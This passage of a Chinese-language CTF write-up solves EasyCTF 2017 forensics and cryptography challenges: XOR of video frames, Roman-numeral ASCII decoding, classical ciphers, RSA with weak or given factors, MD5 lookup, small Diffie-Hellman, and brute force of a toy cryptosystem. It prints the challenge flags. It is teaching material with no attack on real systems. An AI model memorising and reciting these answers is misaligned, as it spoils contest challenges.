<p><a href="http://wenku.baidu.com/view/427b9c5aa76e58fafab003c2" target="_blank">图像基本运算</a></p>
</p>
<p><a href="https://opencv-python-tutroals.readthedocs.io/en/latest/py_tutorials/py_setup/py_setup_in_windows/py_setup_in_windows.html#install-opencv-python-in-windows" target="_blank">Install OpenCV-Python in Windows</a></p>
</p>
<pre><code>ffmpeg -i kittycat.avi kittycat%01d.png</code></pre>
</p>
<p>把视频每帧分离后得到606张png图片每两张表面看上去相似先尝试每两张异或提取出不同的地方</p>
</p>
<pre><code><p>import cv2</p><p>i = 1</p><p>for x in xrange(1, 607, 2): &nbsp;&nbsp;</p><p>&nbsp; &nbsp; img1 = cv2.imread('kittycat' + str(x) +'.png')</p><p>&nbsp; &nbsp; img2 = cv2.imread('kittycat' + str(x + 1) +'.png')</p><p>&nbsp; &nbsp; xor_img = cv2.bitwise_xor(img1, img2)</p><p>&nbsp; &nbsp; cv2.imwrite('xor/xor_img' + str(i) + '.png', xor_img)</p><p>&nbsp; &nbsp; i += 1</p></code></pre>
</p>
</p>
<p>得到303张异或后的图片尝试将它们全部相加</p>
</p>
<pre><code><p>import cv2</p><p>add_img = cv2.imread('xor_img1.png')</p><p>for x in xrange(2, 304):</p><p>&nbsp; &nbsp; img = cv2.imread('xor_img'+ str(x) +'.png')</p><p>&nbsp; &nbsp; add_img = cv2.add(add_img, img)</p><p>cv2.imwrite('add_img.png', add_img)</p></code></pre>
</p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907759187669.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907759187669.png!small" alt=""></p></noscript>
</p>
<p>PS处理一下</p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907759265557.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907759265557.png!small" alt=""></p></noscript>
</p>
<h3>Bizarro</h3>
</p>
<p><b>problem</b></p>
</p>
<p>Something seems very strange about <a href="https://raw.githubusercontent.com/EasyCTF/easyctf-2017-problems/master/bizarro/crpt.png" class="highslide-image" onclick="return hs.expand(this);">this</a> strange looking image. Check it out?</p>
</p>
<p>hint: Red herrings are always a touchy subject. Combine this hint with intel you find in the problem, throw in a blind guess, and perhaps you&#8217;ll stumble into the answer.</p>
</p>
<p><b>solution</b></p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907759497002.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907759497002.png!small" alt=""></p></noscript>
</p>
<pre><code>CI XCVII CXV CXXI XCIX CXVI CII CXXIII CXVI CIV CV CXV XCV CV CXV XCV CX CXI CXVI XCV CXVI CIV CI XCV CII CVIII XCVII CIII CXXV XXXII CV XXXII CVII CX CXI CXIX XXXII CXVI CIV CV CXV XXXII CII CVIII XCVII CIII XXXII CV CXV XXXII CXIX CI CV CXIV C XXXII CV XXXII CVI CXVII CXV CXVI XXXII XCIX XCVII CX XXXIX CXVI XXXII CXII CXVII CXVI XXXII CIX CXXI XXXII CII CV CX CIII CI CXIV XXXII CXI CX XXXII CXIX CIV CXXI</code></pre>
</p>
</p>
<p>罗马数字<a href="https://en.wikipedia.org/wiki/Roman_numerals">Roman numerals</a></p>
</p>
<p><a href="http://www.dcode.fr/roman-numerals">在线转换</a>一下得到一些数字数字大小都不超过255有可能是ASCII值</p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907759594282.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907759594282.png!small" alt=""></p></noscript>
</p>
<pre><code><p>nums = [101,97,115,121,99,116,102,123,116,104,105,115,95,105,115,95,110,111,116,95,116,104,101,95,102,108,97,103,125,32,105,32,107,110,111,119,32,116,104,105,115,32,102,108,97,103,32,105,115,32,119,101,105,114,100,32,105,32,106,117,115,116,32,99,97,110,39,116,32,112,117,116,32,109,121,32,102,105,110,103,101,114,32,111,110,32,119,104,121]</p><p>txt = ''</p><p>for n in nums:</p><p>&nbsp; &nbsp; txt += chr(n)</p><p>print(txt)</p><p>easyctf{this_is_not_the_flag} i know this flag is weird i just can't put my finger on why</p></code></pre>
</p>
</p>
<p>额好吧后来看了大神的<a href="https://github.com/VoidMercy/EasyCTF-Writeups-2017/tree/master/forensics/bizarro" target="_blank">writeup</a>跪了。</p>
</p>
<h2>0&#215;04 Cryptography</h2>
</p>
<h3>Flip My Letters</h3>
</p>
<p><b>problem</b></p>
</p>
<p>I dropped my alphabet on its head, can you help me reassemble it?&nbsp;</p>
</p>
<pre><code>easyctf{r_wlmg_vevm_mvvw_zm_zhxrr_gzyov}</code></pre>
</p>
<p><b>solution</b></p>
</p>
<p>使用了简单的替换的加密方法每个字母被对应另一个字母替换使用基于字典的词频分析在线网站<a href="http://quipqiup.com/" target="_blank">quipqiup</a>解出flag。</p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907759662424.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907759662424.png!small" alt=""></p></noscript>
</p>
<h3>Clear and Concise Commentary on Caesar Cipher</h3>
</p>
<p><b>problem</b></p>
</p>
<p>The flag is in <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/commentary/Commentary.pdf" target="_blank">Commentary.pdf</a>. Use lowercase.</p>
</p>
<p><b>solution</b></p>
</p>
<p>凯撒密码给出的文档值得一看找到文档中RNFLPGS{LBHTBGVG}凯撒密码<a href="https://planetcalc.com/1434/" target="_blank">在线解密</a></p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907759742601.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907759742601.png!small" alt=""></p></noscript>
</p>
<p>最终flag为easyctf{yougotit}            </p>
</p>
<h3>RSA1</h3>
</p>
<p><b>problem</b></p>
</p>
<p>I found somebody&#8217;s notes on their private RSA! Help me crack <a href="https://github.com/EasyCTF/easyctf-2017-problems/tree/master/rsa1" target="_blank">this</a>.</p>
</p>
<p><b>solution</b></p>
</p>
<p><a href="http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html" target="_blank">RSA算法原理</a></p>
</p>
<p><a href="https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95" target="_blank">扩展欧几里得算法</a></p>
</p>
<p><a href="https://github.com/sunnyelf/libnum" target="_blank">libnum模块</a></p>
</p>
<pre><code><p>import libnum</p><p>p = 33499881069427614105926941260008415630190853527846401734073924527104092366847259</p><p>q = 34311544767652906613104559081988349779622789386528780506962212898921316785995851</p><p>e = 65537</p><p>c = 43465248299278658712013216049003172427898782261990372316282214376041873514481386908793943532363461126240609464283533882761307749486816342864113338277082746552</p><p>n = p * q</p><p>phi = (p - 1) * (q - 1)</p><p>d = libnum.modular.invmod(e, phi)</p><p>print libnum.n2s(pow(c, d, n)) #easyctf{wh3n_y0u_h4ve_p&amp;q_RSA_iz_ez_7829d89f}</p></code></pre>
</p>
</p>
<h3>Let Me Be Frank</h3>
</p>
<p><b>problem</b></p>
</p>
<p>I was talking to one of my friends but I couldn&#8217;t quite understand what he was saying. I think it might be important so here it is:&nbsp;</p>
</p>
<pre><code>Nwh whdjwh qm uepen, T tjb fsmt tixgi jsrsh sigm gs mpzp xwqf iahxpv iw fslkt. pehgpxf{qtextz_glacz_elt_neinrw_qsg_bums_dcp}</code></pre>
</p>
<p><b>solution</b></p>
</p>
<p>维吉尼亚密码<a href="https://www.guballa.de/vigenere-solver" target="_blank">解密</a></p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907760022551.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907760022551.png!small" alt=""></p></noscript>
</p>
<h3>RSA2</h3>
</p>
<p><b>problem</b></p>
</p>
<p>Some more RSA! This time, there&#8217;s no P and Q&#8230; <a href="https://github.com/EasyCTF/easyctf-2017-problems/tree/master/rsa2" target="_blank">this</a>.</p>
</p>
<p>solution</p>
</p>
<p><a href="https://sourceforge.net/projects/yafu/" target="_blank">yafu</a>- Automated integer factorization</p>
</p>
<pre><code><p>yafu-x64.exe factor(266965481915457805187702917726550329693157)</p><p>...snip...</p><p>***factors found***</p><p>P21 = 458070420083487550883</p><p>P21 = 582804455845022449879</p></code></pre>
</p>
</p>
<pre><code><p>import libnum</p><p>n = 266965481915457805187702917726550329693157</p><p>p = 458070420083487550883</p><p>q = 582804455845022449879</p><p>e = 65537</p><p>c = 78670065603555615007383828728708393504251</p><p>phi = (p - 1) * (q - 1)</p><p>d = libnum.modular.invmod(e, phi)</p><p>print libnum.n2s(pow(c, d, n)) #flag{l0w_n_0eb6}</p></code></pre>
</p>
</p>
<h3>Decode Me</h3>
</p>
<p><b>problem</b></p>
</p>
<p>Someone I met today told me that they had a perfect encryption method. To prove that there is no such thing, I want you to decrypt this encrypted flag he gave me.</p>
</p>
<p><b>solution</b></p>
</p>
<pre><code><p>import base64</p><p>with open('encrypted_flag.txt') as file:</p><p>&nbsp; &nbsp; data = file.read()</p><p>&nbsp; &nbsp; while True:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if 'easyctf' not in data:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data = base64.b64decode(data)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; else:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break</p><p>&nbsp; &nbsp; print(data) # easyctf{what_1s_l0v3_bby_don7_hurt_m3}</p></code></pre>
</p>
</p>
<h3>Hash on Hash</h3>
</p>
<p><b>problem</b></p>
</p>
<p>There&#8217;s a lot of hex strings here. Maybe they&#8217;re hiding a message? <a href="https://github.com/EasyCTF/easyctf-2017-problems/raw/master/hash-on-hash/hexstrings.txt" target="_blank">hexstrings</a></p>
</p>
<p><b>solution</b></p>
</p>
<pre><code><p>import hashlib</p><p>md5 = {}</p><p>string = ''</p><p>for x in xrange(0, 256):</p><p>&nbsp; &nbsp; char = chr(x)</p><p>&nbsp; &nbsp; md5_obj = hashlib.md5()</p><p>&nbsp; &nbsp; md5_obj.update(char)</p><p>&nbsp; &nbsp; md5_str = md5_obj.hexdigest()</p><p>&nbsp; &nbsp; md5[md5_str] = char</p><p>with open('hexstrings.txt') as file:</p><p>&nbsp; &nbsp; while True:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; line = file.readline().replace('\n', '')</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if len(line) == 0:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break</p><p>&nbsp; &nbsp; &nbsp; &nbsp; string += md5[line]</p><p>print string # easyctf{1_h0p3_y0u_d1dn7_d0_7h47_by_h4nd}</p></code></pre>
</p>
</p>
<h3>RSA 3</h3>
</p>
<p><b>problem</b></p>
</p>
<p>We came across another <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/rsa3/rsa3" target="_blank">message</a> that follows the same cryptographic schema as those other RSA messages. Take a look and see if you can crack it.</p>
</p>
<p><b>solution</b></p>
</p>
<pre><code><p>λ yafu-x64.exe factor(1172115235823606152023154654763747932660073385647694278339165126116107393252225152886841069176950866458540922555424233427042989493814327572078420 5110462278896087432260439082955593874915727686637956899)</p><p>fac: factoring 11721152358236061520231546547637479326600733856476942783391651261161073932522251528868410691769508664585409225554242334270429894938143275720784205110462278896087432260439082955593874915727686637956899</p><p>fac: using pretesting plan: normal</p><p>fac: no tune info: using qs/gnfs crossover of 95 digits</p><p>div: primes less than 10000</p><p>fmt: 1000000 iterations</p><p>Total factoring time = 0.3556 seconds</p><p>***factors found***</p><p>P100 = 3423616853305296708261404925903697485956036650315221001507285374258954087994492532947084586412780871</p><p>P100 = 3423616853305296708261404925903697485956036650315221001507285374258954087994492532947084586412780869</p><p>ans = 1</p></code></pre>
</p>
</p>
<pre><code><p>import libnum</p><p>n = 11721152358236061520231546547637479326600733856476942783391651261161073932522251528868410691769508664585409225554242334270429894938143275720784205110462278896087432260439082955593874915727686637956899</p><p>p = 3423616853305296708261404925903697485956036650315221001507285374258954087994492532947084586412780871</p><p>q = 3423616853305296708261404925903697485956036650315221001507285374258954087994492532947084586412780869</p><p>e = 65537</p><p>c = 2907995727224121244474109148869412603986746589983095760953378907471772983106265015352351411281256847387789301815094608746590512178894738862276459859204020010443067567963450732279228357933677075986407</p><p>phi = (p - 1) * (q - 1)</p><p>d = libnum.modular.invmod(e, phi)</p><p>print libnum.n2s(pow(c, d, n)) # easyctf{tw0_v3ry_merrry_tw1n_pr1m35!!_417c0d}</p></code></pre>
</p>
</p>
<p>推荐文章<a href="http://bobao.360.cn/learning/detail/3058.html" target="_blank">CTF中RSA的常见攻击方法</a></p>
</p>
<h3>Diffie-cult</h3>
</p>
<p><b>problem</b></p>
</p>
<p>I just intercepted some odd <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/diffie-cult/messages.txt" target="_blank">messages.txt</a>. It appears to be a Diffie-hellman protocol, but my math isn&#8217;t good enough to figure out what        the final shared key is. Help! (The answer is a number. There is no easyctf{})Hint: Wikipedia explains Diffie-hellman pretty well.</p>
</p>
<p><b>solution</b></p>
</p>
<pre><code><p>g^a mod p = 421049228295820</p><p>g^b mod p = 105262307073955</p><p>p = 442101689710611</p></code></pre>
</p>
</p>
<p>如果不知道Diffie-Hellman密钥交换算法可以先看</p>
</p>
<p><a href="http://www.cnblogs.com/chenny7/p/6093207.html" target="_blank">Diffie-Hellman密钥交换算法</a></p>
</p>
<p><a href="http://www.cnblogs.com/si812cn/archive/2009/11/26/1611272.html" target="_blank">Diffie-Hellman密钥交换算法及其优化</a></p>
</p>
<p>题目的意思大概就是想让我们求出密钥KDiffie-Hellman密钥交换算法的有效性依赖于计算离散对数的难度<a href="https://www.zhihu.com/question/26030513" target="_blank">知乎-离散对数为什么是难题</a>这里p较小且这题给的 g^a mod p 和 g^b mod p 以及 p 都比较巧 g^a mod p 即使A发送给B的值而 g^b mod p 是B发送给A的值为什么比较巧呢我们在<a href="http://www.factordb.com/" target="_blank">素数库</a>找到他们的标准分解式。</p>
</p>
<pre><code><p>g^a mod p = 421049228295820 = 2^2 · 5 · 17 · 19^3 · 37 · 47^4&nbsp;</p><p>g^b mod p = 105262307073955 = 5 · 17 · 19^3 · 37 · 47^4</p><p>p = 442101689710611 = 3 · 7 · 17 · 19^3 · 37 · 47^4</p></code></pre>
</p>
</p>
<p>现在令 n = 17 · 19^3 · 37 · 47^4 那么就有</p>
</p>
<pre><code><p>g^a mod 21n = 20n</p><p>g^b mod 21n = 5n</p></code></pre>
</p>
</p>
<p>我们把 g^a mod 21n = 20n 化简一下即 g^a mod 21n = -n 因为有 20n mod 21n = -n 至于原理可以看一下密码学基础。</p>
</p>
<p>根据Diffie-Hellman密钥交换协议:</p>
</p>
<h2></h2>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/149077601768.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/149077601768.png!small" alt=""></p></noscript>
</p>
<p>我们求的密钥K等于 K = (g ^ amod p)^b mod p</p>
</p>
<p>也就是: K = (g ^ amod 21n)^b mod 21n 而前面已求过 g^a mod 21n = -n 所以 K = (-n)^b mod 21n 现在只有b的值不知道不过我们可以以b自变量的值为变量研究因变量K的变化情况</p>
</p>
<pre><code><p>n = 17 * (19 ** 3) * 37 * (47 ** 4)</p><p>p = 21 * n</p><p>for b in xrange(1,10):</p><p>&nbsp; &nbsp; k = (-n) ** b % p</p><p>&nbsp; &nbsp; print('k = (-n)^%d mod p = %d' %(b, k))</p></code></pre>
</p>
</p>
<pre><code><p>K = (-n)^b mod 21n</p><p>k = (-n)^1 mod p = 421049228295820</p><p>k = (-n)^2 mod p = 42104922829582</p><p>k = (-n)^3 mod p = 357891844051447</p><p>k = (-n)^4 mod p = 168419691318328</p><p>k = (-n)^5 mod p = 105262307073955</p><p>k = (-n)^6 mod p = 231577075562701</p><p>k = (-n)^7 mod p = 421049228295820</p><p>k = (-n)^8 mod p = 42104922829582</p><p>k = (-n)^9 mod p = 357891844051447</p></code></pre>
</p>
</p>
<p>可以看到当b = 7又开始循环所以K的可能值有6个最后提交验证K为 421049228295820。</p>
</p>
<h3>Security Through Obscurity</h3>
</p>
<p><b>problem</b></p>
</p>
<p>I&#8217;ve never seen such a cryptosystem before! It looks like a public key cryptosystem, though&#8230; Could you help me crack it?</p>
</p>
<p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/security-through-obscurity/encrypt.sage" target="_blank">encrypt.sage</a> <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/security-through-obscurity/publickey_and_ciphertext.txt" target="_blank">publickey and ciphertext.txt</a></p>
</p>
<p><b>solution</b></p>
</p>
<p><a href="http://www.sagemath.org/zh" target="_blank">SageMath</a> 是一个基于GPL协议的开源数学软件。它使用Python作为通用接口将现有的许多开源软件包整合在一起构建一个统一的计算平台。我们的目标创建一个有活力的自由开源软件以替代MagmaMapleMathematica和Matlab。</p>
</p>
<p><a href="http://ai7.org/wp/html/682.html" target="_blank">中文版的SageMath入门手册</a></p>
</p>
<p><a href="http://sagecell.sagemath.org/" target="_blank">sage代码在线运行</a></p>
</p>
<p><a href="https://wenku.baidu.com/view/13c36ec09ec3d5bbfd0a74c8.html" target="_blank">信息安全数学基础-有限域</a></p>
</p>
<p><a href="https://en.wikipedia.org/wiki/Nth_root_algorithm" target="_blank">nth root algorithm</a></p>
</p>
<p>encrypt.sage</p>
</p>
<pre><code><p>p = 196732205348849427366498732223276547339</p><p>primelist = [2,3,5,7,11,13,17,19,23,29,31,37,43,47,53,59]</p><p>secret = REDACTED</p><p>def calc_root(num, mod, n):</p><p>&nbsp; &nbsp; f = GF(mod)</p><p>&nbsp; &nbsp; temp = f(num)</p><p>&nbsp; &nbsp; return temp.nth_root(n)</p><p>def gen_v_list(primelist, p, secret):</p><p>&nbsp; &nbsp; a = []</p><p>&nbsp; &nbsp; for prime in primelist:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; a.append(calc_root(prime, p, secret))</p><p>&nbsp; &nbsp; return a</p><p>def decodeInt(i, primelist):</p><p>&nbsp; &nbsp; pl = sorted(primelist)[::-1]</p><p>&nbsp; &nbsp; out = ''</p><p>&nbsp; &nbsp; for j in pl:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if i%j == 0:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; out += '1'</p><p>&nbsp; &nbsp; &nbsp; &nbsp; else:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; out += '0'</p><p>&nbsp; &nbsp; return out</p><p>def bin2asc(b):</p><p>&nbsp; &nbsp; return hex(int(b,2)).replace('0x','').decode('hex')</p><p>message = REDACTED</p><p>chunks = []</p><p>for i in range(0,len(message),2):</p><p>&nbsp; &nbsp; chunks += [message[i:i+2]]</p><p>vlist = gen_v_list(primelist,p,secret)</p><p>print(vlist)</p><p>for chunk in chunks:</p><p>&nbsp; &nbsp; binarized = bin(int(chunk.encode('hex'),16)).replace('0b','').zfill(16)[::-1] #lsb first</p><p>&nbsp; &nbsp; enc = 1</p><p>&nbsp; &nbsp; for bit in range(len(binarized)):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; enc *= vlist[bit]**int(binarized[bit])</p><p>&nbsp; &nbsp; enc = enc%p</p><p>&nbsp; &nbsp; print(enc)</p></code></pre>
</p>
</p>
<p>publickey and ciphertext.txt</p>
</p>
<pre><code><p>p = 196732205348849427366498732223276547339</p><p>vlist = [186290890175539004453897585557650819247, 75402298316736094226532182518108134406, 125495142022496378270547998225256386407, 97774267687164931514953833940936099082, 101991197227908059637463567354647370660, 153833851791059142883915934225837717549, 57404874013093467650483424580890463792, 21385179362692238453302681296928238570, 73119997627509808412069264512026243174, 187307466063352771786747395191866088255, 99696708971915885525739992181010504930, 35400960589917132410614021764179554582, 165004028169785856134522269878963539096, 23921651712221317415895203722083962980, 101282552285744196401422074083408273639, 36527324251768098978171373433957274016]</p><p>ciphertext = [10804437392992369932709952388461430442, 176193785024128365464527424154073333243, 149270645998191619421663334736314262928, 84083279828403258970202482839973583723, 105542809657403162156368566034837560781, 170535468317794277192003839288646533914, 1709561989051017137832962458645802494, 30208132812353075834728747743616689590, 179552149608863037880916374596103803214, 146319871444551859531557724256502213689, 94266034977624098660397183255753485858, 59624105602644297614582310044425417646, 150207980679551836987813576795479579005, 47189940152625174480564945084004798024, 60923399917552243674613186036841652885, 56060552313063913798237738953734149992, 153365453785043472981157196787373992079, 97439800863356756323659264743487719966, 105572255903480949865247928773026019148, 47189940152625174480564945084004798024, 32547907449246015626932936731350157592, 97471053149217334376536988401195572824, 156999991149661497460742185971412527182, 97705058765750947378422286408948780428, 56123764944636237849915747435965967337, 180380146745295930385428990214293723238, 178014626944341285289827069179285260436, 99504741454750536629756505680249931430]</p></code></pre>
</p>
</p>
<p>大致看一下程序理一下代码逻辑message就是我们要求的明文然后被分成每2个字符为一组添加到chunks列表</p>
</p>
<pre><code><p>message = REDACTED</p><p>chunks = []</p><p>for i in range(0,len(message),2):</p><p>&nbsp; &nbsp; chunks += [message[i:i+2]]</p></code></pre>
</p>
</p>
<p>vlist已经给了所以不用再去求secret接下来就是每2个字符简单的二值化处理再倒序之后就是16次循环加密处理。</p>
</p>
<pre><code><p>vlist = gen_v_list(primelist,p,secret)</p><p>print(vlist)</p><p>for chunk in chunks:</p><p>&nbsp; &nbsp; binarized = bin(int(chunk.encode('hex'),16)).replace('0b','').zfill(16)[::-1] #lsb first</p><p>&nbsp; &nbsp; enc = 1</p><p>&nbsp; &nbsp; for bit in range(len(binarized)):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; enc *= vlist[bit]**int(binarized[bit])</p><p>&nbsp; &nbsp; enc = enc%p</p><p>&nbsp; &nbsp; print(enc)</p></code></pre>
</p>
</p>
<p>加密结果已经给了一共28组所以能推出明文长度为56我们知道ASCII字符的范围0-255再从上面的加密代码分析可知chunk最多就只有256*256=65536种组合再做16次循环加密处理也就是说最多1048576256*256*16次就能把一组明文穷举出来计算机对1048576这个次数简直毫无压力所以上代码</p>
</p>
<pre><code><p>p = 196732205348849427366498732223276547339</p><p>vlist = [186290890175539004453897585557650819247, 75402298316736094226532182518108134406, 125495142022496378270547998225256386407, 97774267687164931514953833940936099082, 101991197227908059637463567354647370660, 153833851791059142883915934225837717549, 57404874013093467650483424580890463792, 21385179362692238453302681296928238570, 73119997627509808412069264512026243174, 187307466063352771786747395191866088255, 99696708971915885525739992181010504930, 35400960589917132410614021764179554582, 165004028169785856134522269878963539096, 23921651712221317415895203722083962980, 101282552285744196401422074083408273639, 36527324251768098978171373433957274016]</p><p>ciphertext = [10804437392992369932709952388461430442, 176193785024128365464527424154073333243, 149270645998191619421663334736314262928, 84083279828403258970202482839973583723, 105542809657403162156368566034837560781, 170535468317794277192003839288646533914, 1709561989051017137832962458645802494, 30208132812353075834728747743616689590, 179552149608863037880916374596103803214, 146319871444551859531557724256502213689, 94266034977624098660397183255753485858, 59624105602644297614582310044425417646, 150207980679551836987813576795479579005, 47189940152625174480564945084004798024, 60923399917552243674613186036841652885, 56060552313063913798237738953734149992, 153365453785043472981157196787373992079, 97439800863356756323659264743487719966, 105572255903480949865247928773026019148, 47189940152625174480564945084004798024, 32547907449246015626932936731350157592, 97471053149217334376536988401195572824, 156999991149661497460742185971412527182, 97705058765750947378422286408948780428, 56123764944636237849915747435965967337, 180380146745295930385428990214293723238, 178014626944341285289827069179285260436, 99504741454750536629756505680249931430]</p><p>plaintext = ''</p><p>for i in ciphertext:</p><p>&nbsp; &nbsp; find = False</p><p>&nbsp; &nbsp; for j in xrange(256):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if find:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break</p><p>&nbsp; &nbsp; &nbsp; &nbsp; for k in xrange(256):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; chunk = chr(j) + chr(k)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; binarized = bin(int(chunk.encode('hex'),16)).replace('0b','').zfill(16)[::-1]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; enc = 1</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; for bit in range(len(binarized)):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; enc *= vlist[bit]**int(binarized[bit])</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; enc = enc%p</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if enc == i:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; find = True</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; plaintext += chunk</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break</p><p>print(plaintext)</p></code></pre>
</p>
</p>
<pre><code><p>flag{i_actu4lly_d0nt_know_th3_name_of_th15_crypt0sy5tem}&nbsp;</p><p>used time:18.040904s</p></code></pre>
</p>
</p>
<h3>Lost Seed</h3>
</p>
<p><b>problem</b></p>
</p>
<p>Every time I encrypt a flag with this <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/lost-seeds/encrypt" target="_blank">program</a>, it gives me something <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/lost-seeds/flag.out" target="_blank">different</a>.</p>
</p>
<p><b>solution</b></p>
</p>
<pre><code><p>int __cdecl main(int argc, const char **argv, const char **envp)</p><p>{</p><p>&nbsp; char v3; // bl@2</p><p>&nbsp; int result; // eax@4</p><p>&nbsp; __int64 v5; // rcx@4</p><p>&nbsp; char v6; // [sp+Bh] [bp-85h]@2</p><p>&nbsp; int v7; // [sp+Ch] [bp-84h]@1</p><p>&nbsp; int v8; // [sp+10h] [bp-80h]@1</p><p>&nbsp; int v9; // [sp+14h] [bp-7Ch]@2</p><p>&nbsp; FILE *stream; // [sp+18h] [bp-78h]@1</p><p>&nbsp; char ptr[88]; // [sp+20h] [bp-70h]@1</p><p>&nbsp; __int64 v12; // [sp+78h] [bp-18h]@1</p><p>&nbsp; v12 = *MK_FP(__FS__, 40LL);</p><p>&nbsp; stream = fopen("flag.in", "r");</p><p>&nbsp; fread(ptr, 1uLL, 0x50uLL, stream);</p><p>&nbsp; fclose(stream);</p><p>&nbsp; stream = fopen("flag.out", "wb");</p><p>&nbsp; seed = realrand("flag.out", "wb");</p><p>&nbsp; v7 = 0;</p><p>&nbsp; v8 = strlen(ptr);</p><p>&nbsp; while ( v7 &lt; v8 )</p><p>&nbsp; {</p><p>&nbsp; &nbsp; v3 = ptr[v7];</p><p>&nbsp; &nbsp; v9 = pseudorand();</p><p>&nbsp; &nbsp; v6 = v3 ^ v9;</p><p>&nbsp; &nbsp; fwrite(&amp;v6, 1uLL, 1uLL, stream);</p><p>&nbsp; &nbsp; ++v7;</p><p>&nbsp; }</p><p>&nbsp; fclose(stream);</p><p>&nbsp; result = 0;</p><p>&nbsp; v5 = *MK_FP(__FS__, 40LL) ^ v12;</p><p>&nbsp; return result;</p><p>}</p></code></pre>
</p>
</p>
<h3>Listen Closely</h3>
</p>
<p><b>problem</b></p>
</p>
<p>We intercepted a secret message, but we can&#8217;t tell what it&#8217;s saying. Maybe you can help? <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/listen-closely/listenclosely.wav" target="_blank">super secret message</a>hint: 1, 16, 8000.        After you use those, the problem is strictly crypto.</p>
</p>
<p><b>solution</b></p>
</p>
<p><a href="https://writeups.easyctf.com/" target="_blank">writeup</a></p>
</p>
<h3>Genius</h3>
</p>
<p><b>problem</b></p>
</p>
<p>Your boss told you that <a href="http://genius.web.easyctf.com/" target="_blank">this</a> team has come up with the cryptographic hash of the future, but something about their operation just seems a little fishy.</p>
</p>
<p><b>solution</b></p>
</p>
<pre><code><p>8a7fca9234d2f19c8abfcd812971a26c8c510dcaefd5061b191ad41d8b57d0ce631f5074f94b32730d0c025f1d7aacd7</p><p>be1ab1632e4285edc3733b142935c60b90383bad42309f7f6850d2b4250a713d0b2d7a97350465a02554d29d92bfefaf</p><p>d64ddd0de1b187cd670783f5e28d681dd401ed3009d05ce4ef600d364a2c953e4cc801b880dddef59829a5ad08bd8a63</p><p>73d559bc117f816333174e918d0587de5cca214701dbe9f7f42da7bccf074b811292b9d4dc398866ef95869b22b3941e</p><p>78635bc95eaa7662a2ddf3e3d45cf1084f4233d6c396e8a0e6fbf597d07b88178d03f3f7757bdbdaaed60729d08bb180</p><p>b42dad5453b2128a32f6612b13ea5d9fef843bee79633652a6d6ae08e964609f00e883ab809346226dff6887080fb68b</p></code></pre>
</p>
</p>
<p>给了6组哈希值每组96个字符还提示到了MD5于是丢<a href="https://crackstation.net/" target="_blank">crackstation</a>跑一下</p>
</p>
